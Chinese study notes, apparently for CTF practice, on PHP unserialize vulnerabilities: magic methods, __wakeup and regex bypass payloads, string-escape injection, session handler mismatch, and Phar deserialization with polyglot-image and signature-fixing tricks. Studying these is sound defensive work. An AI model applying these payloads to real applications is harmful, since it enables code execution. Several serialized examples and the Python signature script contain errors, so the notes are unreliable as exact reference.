

## 1.序列化

* 序列化：将对象，变量转化为字符串，通过serialize()实现；

* 各类型序列化后的值：

  | 类型         | 例子                           | 序列化后                                           |
  | ------------ | ------------------------------ | -------------------------------------------------- |
  | int          | 20                             | i:20;                                              |
  | 空字符       | null                           | N;                                                 |
  | float/double | 3.3                            | d:3.3;                                             |
  | boolean      | ture<br />false                | b:1;<br />b:0;                                     |
  | string       | "hello"                        | s:5:"hello";                                       |
  | object       | test,具有name=“hutao”，age=16  | O:6:test:2:{s:4:"hutao";i:16;}                     |
  | array        | array{"hu"=>"hutao","age"=>16} | a:6:array:2:{s:2:"hu";s:5:"hutao";s:3:"age";i:16;} |

   

## 2. 反序列化

* 反序列化：将字符串转化为对象，通过unserialize()实现
* 属性为private时，序列化后会在值前面加 %00 类名 %00 用url编码后，才看得见类名两边的字符。
* 属性为protected 时， 序列化后会在值前面加 %00 * %00 或者%00test%00

***

## 3.魔术方法

魔术方法是在特定条件下自动触发的方法

* __construct() 		//构造时

  * 只在new时触发，反序列化不会

* __destruct()    		//摧毁对象时

  * 至少触发一次，代码运行完后销毁对象

  ***

* __call($\arg1,$arg2)	 		    //方法不存在

  * 可以不写参数，会自动读取。$arg1：不存在的 **方法名**     \$arg2: 不存在的方法的 **参数**

* __callStatic(\$name,$arguments)                   //调用不可访问,不存在的静态方法

* __get()                             //调用的属性不存在

***

* __set($arg1,$arg2)                             //给不存在，不可访问的属性赋值
  * \$arg1：属性名，$arg2：值
* __isset($arg1)                            //当不可访问的属性调用isset() 或empty()
* __unset()                         //不可访问的属性调用unset()【销毁变量】

***

* __toString()                        //把对象当字符串
  * print_r和var_dump可以调用对象，echo和print只能调用字符串

  * 
* __invoke()                         //把对象当作函数调用时

***

* __sleep()                           //序列化之前
  * 序列化seialize()会检查类有没有_ _ sleep()，会优先执行 __sleep()方法

* __wakeup()                       //反序列化之前

***

* __clone()                            //使用clone拷贝一个对象后  







## 5.绕过

### __wakeup() 绕过

（5-5.6.25） （7-7.0）

原理：unserialize()的时候，字符串属性的个数比实际的的个数少，不会调用__wakeup()   

```php
O:4:'test':2:{s:4:'name';s:hutao;} # 实际只有一个属性，会绕过wakeup #
```

###  __destruct利用

> 1. 程序正常结束
> 2. 对象没有被引用
> 3. $obj=null。对象变量被置为null
> 4. unset($obj)

* $obj=null

  ```php
  <?php class test
  {
      function __destruct()
      {
          echo 'success!!';
      }
  }
  if (isset($_REQUEST['input'])) {
      $a = unserialize($_REQUEST['input']);
      throw new Exception('lose');
  }
  
  ```

  这里没有正常结束。不会触发destruct。
  利用数组，在将index=1反序列为对象后，由将它null，触发destruct

  ```php
  a:2:{i:0;O:4:"test":0:{}i:0;N;}
  ```

  

### 绕过正则

> ```php
> preg_match('/O:\d+/') #匹配开头是对象的序列
> ```

* 数组绕过

  ```php
  serialize(array($a));#将对象数组化，绕过
  ```

* +号绕过

  ```php
  $a = 'O:+4:"test":1:{s:1:"a";s:3:"abc";}';
  $a = 'O:%2B4:"test":1:{s:1:"a";s:3:"abc";}';
  #表示allow_classes允许的类才能进行反序列化
  ```

### 引用

> 两个属性引用相同的地址，这样两个值就相等，实现需要值相等，但是值被过滤。

```php
#payload：
__construct(){
    $this->$a=&$this->$b;
}
```

### 大小S当16进制绕过

> 字符类型符大写时，值会当作16进制。

```php
$a = 'O:4:"test":1:{S:8:"\75sername";s:5:"admin";}'; #\75是16进制。绕过preg_match。
```

### php类名不区分大小写

```php
O:1:"a":1:{s:1:"a";O:1:"B":1:{s:1:"b";S:3:"\66aa";}}
O:1:"A":1:{s:1:"a";O:1:"B":1:{s:1:"b";S:3:"\66aa";}}
#都是A类，不管大小写。
```

### 空格绕过

在linux中，空格可用${IFS}代替

### 字符串逃逸

对字符串进行操作(过滤危险字符串)，改变字符串结构，导致无法正常反序列化。根据过滤后字符串增多减少，将逃逸分为曾多，减少。
**在结构正确的情况下** 属性的值取决于 **数字**，多余的不会读入。
`$a="O:4:'test':1:{s:4:'name';s:4:'hutao';}" s:4:'helo';N}`正常执行

*  **字符串增多**

```php
$v1="system()fs";$v2="evll"//当过滤system，将system替换为systemmm
//O:4:'test':1:{s:2:'v1';s:10:'system()fs';s:2:'v2';s:4:'evll'}

$a="systemmm()fs";
//O:4:'test':2:{s:2:'v1';s:10:'systemmm()fs';s:2:'v2';s:4:'evll';} 无法反序列化 fs为多余的，

构造：将fs替换为';s:?:'v3';s:4:'eval';}
//O:4:'test':2:{s:2:'v1';s:10:'systemmm()';s:?:'v3';s:4:'eval';};s:2:'v2';s:4:'evll';}从而后面的v2逃逸
```

* **字符串减少**

```

```

## 6. session_start()

当**session_start()被调用**或者**php.ini中session.auto_start的值为1**时。php会调用会话管理器，访问用户session，并将器序列化储存在指定目录(/tmp)
漏洞产生：数据存储格式很多，**写入和读取格式不同**，这个过程会导致格式打乱，会产生漏洞.
写入：

| 处理器                    | 存储格式                       | 例子$_SESSION['a']="hutao" |
| ------------------------- | ------------------------------ | -------------------------- |
| php(默认)                 | 键名 \| 序列化后的参数         | a \| s:5:"hutao"           |
| php_serialize(php>+5.5.4) | 序列化后的数组                 | a:1:{s:1:"a";s:5:"hutao";} |
| php_binay                 | ascii(键长) 键名 serialize(值) |                            |

## 7. Phar反序列化

压缩的php包。
php5.3版本以上，Phar后缀默认开启。

Phar文件构成：
| 名称                                     | 说明                                                         |
| ---------------------------------------- | ------------------------------------------------------------ |
| stub phar(文件标识)                      | 格式xxx\<?php php_code; _\_HALT_COMPILER();?><br />必须以\_\_HALT_COMPILER()结尾 |
| manifest(文件的属性信息，已经序列化存储) |                                                              |
| contents(文件内容)                       |                                                              |
| signature(签名)                          |                                                              |

用phar伪协议解析文件时，会自动将manifest里序列化的字符串进行反序列化  




### 制作phar包

```php
<?php
class test {}
$obj = new test();

$phar = new Phar("demo.phar");   #创建phar对象。会尝试把某个文件转为phar文件
$phar->startBuffering();  #开始设置

$phar->setStub("<?php __HALT_COMPILER(); ?>"); #设置stub
$phar->setMetadata($obj); #将对象写入meta-data mainifest
$phar->addFromString("flag.php", "flag.txt"); #添加要压缩的文件

$phar->stopBuffering();

```

### 利用

> 制作phar文件上传，读取进行反序列化。进而rce
> php.ini的 phar.read_only需要为off

* 在可以读取文件的地方，使用phar协议读取

### phar的绕过

#### 后缀绕过

> 识别phar文件，是看有没有__HALT_COMPILER();不看文件后缀，改为jpg后缀也能执行

#### 利用协议

```php
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

> 后面是读取phar内部文件，

#### 绕过文件头检查

> 可能会检查文件头，一看<?php，就过滤。

*  stub添加图片文件头

  ```php
  $stub = "<?php /*\xFF\xD8\xFF\xE0 */ __HALT_COMPILER(); ?>";
  ```

* 利用压缩流

  ```php
  compress.bzip://phar:///test.phar/test.txt
  compress.bzip2://phar:///test.phar/test.txt
  compress.zlib://phar:///home/sx/test.phar/test.txt
  ```

* 图片拼接

  ```php
  copy("real.jpg", "evil.jpg");
  $phar = new Phar("evil.jpg");
  $phar->startBuffering();
  $phar->addFromString("a.txt", "aaa");
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering(); 
  ```

  > 通过将phar文件拼接到真实文件后面。

#### 签名修改

> 文件后面又一个4字节的签名
> ![微信图片_20250423171110](D:\picture\node\微信图片_20250423171110.png)

签名加密方式，看47 42 4D 42前面都4个字节。这里是小端字节。
| hex         | 方式    | 长度                               |
| ----------- | ------- | ---------------------------------- |
| 00 00 00 00 | 无签名  | 4(标识)+4(方式)=8                  |
| 01 00 00 00 | md5     | 4(标识)+4(方式)+16(128bit md5)=24  |
| 02 00 00 00 | SHA1    | 4(标识)+4(方式)+20(160bit SHA1)=28 |
| 03 00 00 00 | SHA256  |                                    |
| 04 00 00 00 | SHA512  |                                    |
| 05 00 00 00 | OPENSSL |                                    |

* 可将签名修改为null，可能可以绕过

* 当修改phar文件后，但是签名没有改变。如果对签名敏感，不符合的签名不会包含。。可以修改

  ```python
  from hashlib import *
  
  with open("demp.phar","rb") as file:  #二进制形式打开文件
      f=file.read  #读取
  data=f[:-28] #获取待加密的数据
  h=f[-8:] #读取标识和签名方式
  new_f=data+sha1(data).digest()+h
  with open("new.phar",wb) as new_file:
      new_file.write("new_f")
  ```

  
